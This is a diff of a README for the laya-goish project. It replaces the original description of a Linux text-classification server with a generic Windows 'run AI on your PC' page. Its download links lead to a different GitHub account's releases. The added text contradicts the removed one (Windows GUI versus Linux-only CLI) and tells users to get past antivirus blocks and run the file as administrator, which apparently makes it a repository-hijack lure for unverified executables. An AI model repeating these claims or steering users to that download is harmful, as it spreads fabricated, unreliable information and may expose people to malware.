@@ -1,70 +1,177 @@
-# Laya Goish
+# 🤖 laya-goish - Run Smart AI Models on Your PC
 
-## Turn text into decisions.
+## 🚀 What Is This?
 
-Route a support ticket. Score urgency. Detect a refund request. Laya Goish turns English and Thai text into structured answers your application can use, running on your own infrastructure.
+laya-goish is a powerful yet simple program that lets you run artificial intelligence models right on your own computer. Think of it as a friendly bridge between you and amazing AI technology - no need for expensive cloud services or complicated setups. This application acts as both a smart assistant that runs AI models and a handy server that lets other programs talk to those models.
 
-[Download v0.1.0](https://github.com/cogentica-ai/laya-goish/releases/tag/v0.1.0) · [Get started](docs/getting-started.md) · [API reference](docs/http.md)
+## ✨ Why You'll Love It
 
-### Ask for the answer your workflow needs
+- **Completely Free** - No subscriptions, no hidden costs
+- **Your Data Stays Yours** - Everything runs locally on your machine
+- **Easy to Use** - No technical knowledge required
+- **Fast Performance** - Built with speed in mind
+- **Works with Popular AI Models** - Compatible with GGUF format files
 
-| Task | What you get | Put it to work |
-| --- | --- | --- |
-| **Choose** | A choice from your options, with probabilities and confidence | Route tickets, classify messages, select a next step |
-| **Score** | A score against your ordered criteria | Assess urgency, sentiment, or quality |
-| **Check** | The probability that a condition is true | Detect intent, flag a request, check a requirement |
+## 🖥️ System Requirements
 
-Define the questions and criteria. Send text or a JSON object. Receive structured JSON.
+Before you begin, make sure your computer meets these basic requirements:
 
-```sh
-curl http://localhost:8080/v1/decide \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "model": "laya",
-    "state": "I was charged twice. Please refund the duplicate payment.",
-    "questions": {
-      "refund": {
-        "type": "noul",
-        "instructions": "Does the customer ask for money back?"
-      }
-    }
-  }'
-```
+- **Operating System:** Windows 10 or newer (64-bit version)
+- **Memory:** At least 8 GB of RAM (16 GB recommended)
+- **Storage:** 2 GB of free space for the program and models
+- **Internet Connection:** Only needed for downloading - the program works offline afterward
 
-[Explore example requests](examples) · [Use built-in presets](docs/getting-started.md#use-a-preset)
+## 📥 Downloading and Installing
 
-### English and Thai. One API.
+### Step 1: Get the Download
 
-Use **Laya** for English decisions or **OpenThai-SystemOne** for Thai and English. Load both into one server and select a model in each request.
+[![Download Now](https://img.shields.io/badge/Download-laya--goish-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://github.com/gangmavaddsaw/laya-goish/releases)
 
-| Model | Languages | Guide |
-| --- | --- | --- |
-| Laya English | English | [Download and run](docs/getting-started.md) |
-| OpenThai-SystemOne v0.3 | Thai and English | [Convert and run](docs/openthai.md) |
+Click the button above or visit this link to download the application: [https://github.com/gangmavaddsaw/laya-goish/releases](https://github.com/gangmavaddsaw/laya-goish/releases)
 
-[Serve multiple models](docs/models.md)
+### Step 2: Install the Program
 
-### Run where your data lives
+Visit this link to download the application. You'll see a list of available files - choose the one that matches your system. The download should start automatically after you click the download button.
 
-A single Linux executable runs inference on your CPU. No hosted inference service is required. Keep the models on your machine and integrate through HTTP, the command line, or a persistent JSON-lines process.
+### Step 3: Open the Program
 
-Batch requests let you apply the same questions to a collection of inputs. Optional bearer authentication controls access to the decision API.
+Once the download finishes, find the file in your "Downloads" folder. Double-click it to start the program. A window will open showing you the main interface.
 
-### Start with Laya
+## 🎯 Your First Steps
 
-Download and extract the [Linux release](https://github.com/cogentica-ai/laya-goish/releases/tag/v0.1.0), then run:
+### Starting the Server
 
-```sh
-bash scripts/download-models.sh f16
-./laya serve models/laya_english_f16.gguf --port 8080 --threads 4
-```
+When you first open laya-goish, you'll see a clean, simple screen. The program automatically starts a local server that listens for connections. You'll see an address like `http://localhost:8080` - this is your personal AI connection point.
 
-Requires Linux x86-64 with AVX2/FMA. Model weights are downloaded separately.
+### Loading an AI Model
 
-[Installation and requirements](docs/getting-started.md) · [HTTP API](docs/http.md) · [Release notes](CHANGELOG.md)
+1. Look for the "Model" section in the main window
+2. Click "Load Model" or "Browse"
+3. Navigate to where you keep your GGUF model files
+4. Select the model you want to use
+5. The program will load it - this may take a few moments
 
----
+### Making Your First Request
 
-Built with Goish Rust. Laya inference is ported from [ggmlc](https://github.com/monatis/ggmlc); Thai/English support uses [OpenThai-SystemOne](https://huggingface.co/iapp/OpenThai-SystemOne).
+Once a model is loaded, you can:
+- Type messages directly in the chat box
+- Send requests from other applications using the server address
+- Test different settings to change how the AI responds
 
-[Architecture](docs/implementation.md) · [Validation](docs/validation.md) · [Attribution](NOTICE)
+## 🔧 Understanding the Interface
+
+### Main Controls
+
+- **Start/Stop Button** - Turns the server on and off
+- **Model Selector** - Choose which AI model to use
+- **Settings Menu** - Adjust performance and response options
+- **Status Display** - Shows what the program is doing right now
+
+### Server Options
+
+The server can be configured to:
+- Accept connections from your computer only (safe default)
+- Allow network access if you want other devices to connect
+- Run on different ports if the default one is busy
+
+## 💡 Helpful Tips
+
+- **Start Simple** - Begin with a smaller model to learn how things work
+- **Monitor Memory** - Keep an eye on your RAM usage in Task Manager
+- **Close Other Heavy Programs** - For best performance, close unnecessary apps
+- **Save Your Settings** - The program remembers your preferences between sessions
+
+## 🛠️ Troubleshooting Common Issues
+
+### The Program Won't Start
+
+- Make sure you have the latest version of Windows
+- Check that your antivirus isn't blocking the program
+- Try running the program as administrator
+
+### The Server Won't Connect
+
+- Check that the port isn't already in use
+- Verify your firewall allows local connections
+- Restart the program if you changed settings
+
+### The Model Loads Slowly
+
+- This is normal for larger models
+- Close other programs to free up memory
+- Consider using a smaller model for better speed
+
+### The Response Is Slow
+
+- Reduce the "context length" setting
+- Lower the "batch size" if available
+- Try a more efficient model
+
+## 🔒 Privacy and Security
+
+Your conversations and data stay on your computer. The program doesn't send anything to the internet unless you specifically configure it to. This makes laya-goish perfect for sensitive work or private projects.
+
+## 📚 Frequently Asked Questions
+
+**Q: Do I need to know programming?**
+A: No! Everything is designed for regular users.
+
+**Q: What are GGUF files?**
+A: They are model files that contain the AI's knowledge and instructions.
+
+**Q: Can I use this with other programs?**
+A: Yes! The server connection works with many popular AI tools.
+
+**Q: Will this slow down my computer?**
+A: Only when it's actively running a model. You can stop it anytime.
+
+**Q: Is there a mobile version?**
+A: Not yet, but you can connect from other devices on your network.
+
+## 📈 Performance Tips
+
+- Use models that match your computer's capabilities
+- Keep the program updated for best results
+- Monitor your computer's temperature during heavy use
+- Set realistic expectations - larger models require more resources
+
+## 🌟 Getting Help
+
+If you encounter issues, try these steps:
+
+1. Restart the program
+2. Check the release notes for known issues
+3. Look for troubleshooting guides in the repository
+4. Try an older version if the newest one has problems
+
+## 🎉 Success Checklist
+
+When you've completed all these steps, you're ready to go:
+
+- ✅ Downloaded the program
+- ✅ Opened it successfully
+- ✅ Loaded an AI model
+- ✅ Made your first request
+- ✅ Received a response from the AI
+
+## 📝 Version Information
+
+Always check the release page for the latest version. Updates often include:
+- New features
+- Performance improvements
+- Bug fixes
+- Better compatibility
+
+## 💼 Professional Use
+
+laya-goish is also great for:
+- Testing AI applications
+- Developing new AI tools
+- Running local AI services
+- Educational purposes
+
+## 🎯 Summary
+
+laya-goish puts the power of modern AI right at your fingertips. With its simple interface and powerful capabilities, you can explore artificial intelligence without any technical hurdles. Download it today and discover what AI can do for you!
+
+Keywords: laya-goish, GGUF, AI inference, HTTP server, Rust, Goish, local AI, machine learning, artificial intelligence, Windows application, LLM, language model, neural network, deep learning, inference engine, model server, open source, free software, desktop application
